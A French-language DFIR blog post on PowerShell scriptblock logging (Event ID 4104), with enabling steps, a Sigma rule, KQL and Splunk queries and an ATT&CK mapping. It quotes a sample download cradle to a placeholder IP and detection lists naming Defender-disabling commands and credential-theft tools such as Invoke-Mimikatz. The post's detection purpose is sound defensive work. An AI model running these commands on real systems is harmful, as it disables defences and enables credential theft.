---
title: "PowerShell Event ID 4104 expliqué : scriptblock logging pour le DFIR"
description: "Le scriptblock logging est le contrôle défensif gratuit le plus utile de Windows. Il enregistre le corps complet du script — y compris obfusqué ou en mémoire — sous l'événement 4104."
date: "2026-05-17"
---

Quand le scriptblock logging PowerShell est activé, le moteur enregistre le corps de chaque script exécuté — commandes interactives, scripts chargés depuis le disque, et tout ce qui est réflecté en mémoire par `Invoke-Expression` ou `IEX`. L'enregistrement atterrit sur le [canal](/fr/blog/what-is-an-evtx-file) `Microsoft-Windows-PowerShell/Operational` sous l'event ID **4104**, « Creating Scriptblock text ».

## Ce que vous obtenez

```xml
<Data Name="MessageNumber">1</Data>
<Data Name="MessageTotal">1</Data>
<Data Name="ScriptBlockText">$wc = New-Object Net.WebClient; $wc.DownloadString('http://203.0.113.5/a')</Data>
<Data Name="ScriptBlockId">{guid}</Data>
<Data Name="Path">C:\Users\alice\Downloads\setup.ps1</Data>
```

Pour un long script, PowerShell le découpe en plusieurs enregistrements 4104 (un par numéro de message). Les rejoindre est essentiel — les fragments sont faciles à mal lire.

## Comment l'activer

Le paramètre est `HKLM\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging = 1`, équivalent à la Group Policy *Configuration ordinateur → Modèles d'administration → Composants Windows → Windows PowerShell → Activer la journalisation des blocs de script PowerShell*. Il n'y a pas de coût PowerShell mesurable — activez-le partout.

## Ce qu'il attrape que rien d'autre ne fait

Le moteur PowerShell journalise le script **après** tout encodage, compression ou réflexion en mémoire. Cela signifie :

- Une invocation `-EncodedCommand` journalise à la fois le launcher encodé (dans le ProcessCreate / 4688 correspondant) et le corps décodé (dans 4104).
- Un script qui télécharge et `Invoke-Expression`-e une payload distante journalise le corps *exécuté*, pas le wrapper.
- Un attaquant utilisant des bypasses AMSI laisse quand même l'enregistrement 4104 — le bypass affecte le scanning, pas le logging.

C'est le contrôle défensif gratuit le plus utile de la plateforme. Les défenseurs qui n'ont pas d'EDR ont généralement ça.

## Trier 4104 à grande échelle

Les patterns à fort signal dans un corpus de 4104 :

- `DownloadString`, `DownloadFile`, `Invoke-WebRequest`, `Net.WebClient` — récupération de contenu distant.
- `IEX`, `Invoke-Expression` — exécution dynamique.
- `FromBase64String`, `[System.Convert]::FromBase64String` — payload encodée.
- `Add-MpPreference -ExclusionPath` — tampering Defender.
- `Set-MpPreference -DisableRealtimeMonitoring` — tampering Defender.
- `[System.Reflection.Assembly]::Load`, `[Reflection.Emit]` — chargement d'assemblies en mémoire.
- `Invoke-Mimikatz`, `Invoke-Kerberoast`, `Invoke-BloodHound` — outillage offensif connu.

Une correspondance seule n'est pas toujours malveillante (les admins utilisent aussi `DownloadString`), mais les combinaisons le sont. Pivotez de 4104 vers le [Sysmon event 1](/fr/blog/sysmon-event-id-1-process-create) / 4688 correspondant par timestamp + processus pour récupérer le contexte d'invocation complet.

## Exemple de règle Sigma — outillage offensif PowerShell dans le scriptblock

```yaml
title: Suspicious PowerShell Scriptblock — Offensive Tool Indicators
id: 4f1a3b8d-2c5e-4d8f-9a3b-1c2d3e4f5a6b
status: stable
description: PowerShell scriptblock body contains strings characteristic of offensive tooling, encoded payloads, or in-memory reflection.
references:
  - https://attack.mitre.org/techniques/T1059/001/
  - https://attack.mitre.org/techniques/T1027/
logsource:
  product: windows
  service: powershell
  category: ps_script
detection:
  selection_offensive:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Invoke-Mimikatz'
      - 'Invoke-Kerberoast'
      - 'Invoke-BloodHound'
      - 'Invoke-DCSync'
      - 'New-PSInjection'
      - 'Get-PassHashes'
  selection_reflective:
    EventID: 4104
    ScriptBlockText|contains:
      - 'System.Reflection.Assembly]::Load'
      - '[Reflection.Emit]'
      - 'FromBase64String'
  selection_defender_tamper:
    EventID: 4104
    ScriptBlockText|contains:
      - 'Set-MpPreference -DisableRealtimeMonitoring'
      - 'Add-MpPreference -ExclusionPath'
      - 'Set-MpPreference -DisableIOAVProtection'
  condition: selection_offensive or selection_reflective or selection_defender_tamper
falsepositives:
  - Defenders running known offensive tooling for testing (whitelist by host)
  - Software installers using reflection for legitimate purposes
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - attack.defense_evasion
```

## Exemple KQL — PowerShell encodé depuis un utilisateur peu privilégié

```kusto
let encoded =
    Event
    | where Source == "Microsoft-Windows-PowerShell" and EventID == 4104
    | extend XmlData = parse_xml(EventData)
    | extend ScriptBlockText = tostring(XmlData.EventData.Data[2])
    | where ScriptBlockText contains "FromBase64String"
       or ScriptBlockText matches regex @"\b-e(?:nc|ncodedcommand)?\b\s"
    | project TimeGenerated, Computer, UserId=tostring(XmlData.System.Security["@UserID"]), ScriptBlockText;
encoded
| where UserId !startswith "S-1-5-18"   // exclude LocalSystem
   and UserId !startswith "S-1-5-19"
   and UserId !startswith "S-1-5-20"
| order by TimeGenerated desc
```

## Exemple Splunk — tampering Defender depuis PowerShell

```spl
index=powershell EventCode=4104
   ( ScriptBlockText="*Set-MpPreference*DisableRealtimeMonitoring*"
     OR ScriptBlockText="*Add-MpPreference*ExclusionPath*"
     OR ScriptBlockText="*Set-MpPreference*DisableIOAVProtection*" )
| table _time host UserID ScriptBlockText
```

## Cartographie ATT&CK

- **T1059.001 — Command and Scripting Interpreter: PowerShell** : chaque 4104 offensif colle ici. PowerShell est l'une des techniques d'exécution les plus citées dans les intrusions modernes.
- **T1027 — Obfuscated Files or Information** : motifs encodés / Base64 / `FromBase64String`.
- **T1059.001 + T1140 — Deobfuscate/Decode Files or Information** : le moteur journalise la forme *décodée*, qui est la valeur que 4104 apporte par rapport à [4688](/fr/blog/event-id-4688-process-creation).
- **T1562.001 — Impair Defenses: Disable or Modify Tools** : `Set-MpPreference -DisableRealtimeMonitoring`, `Add-MpPreference -ExclusionPath`.
- **T1003.001 — OS Credential Dumping: LSASS Memory** : motifs `Invoke-Mimikatz`, `MiniDump`, `comsvcs.dll` dans les corps de scripts.
- **T1558.003 — Kerberoasting** : motifs `Invoke-Kerberoast`, `Rubeus kerberoast`.

## Faux positifs qui ressemblent exactement à des attaques

- **Runbooks d'admin** utilisent parfois `Invoke-Expression` légitimement pour de la configuration templatée. La combinaison est généralement courte, répétable et depuis des sessions admin connues.
- **Scripts de gestion Defender** (IT corporate) appellent `Set-MpPreference` légitimement pour pousser des listes d'exclusion. Whitelistez par le certificat de signature du script ou le SID de l'hôte.
- **Installeurs Chocolatey / WinGet / package** utilisent du PowerShell Base64-encodé légitimement. Pattern : court, en journée, depuis des hôtes build/admin.
- **Activité red-team / pentest** sera identique à de vraies attaques. Coordonnez les fenêtres d'engagement et taguez les IP source de l'opérateur.

## Le point aveugle

4104 journalise le corps du *script*. Il ne journalise pas l'exécution par déclaration, les retours de fonctions ou les valeurs de variables. Pour ça, il faut la transcription (event 4103, « Module logging ») ou un vrai EDR. 4104 vous dit ce qui a tourné ; le reste vous dit ce qu'il a fait.
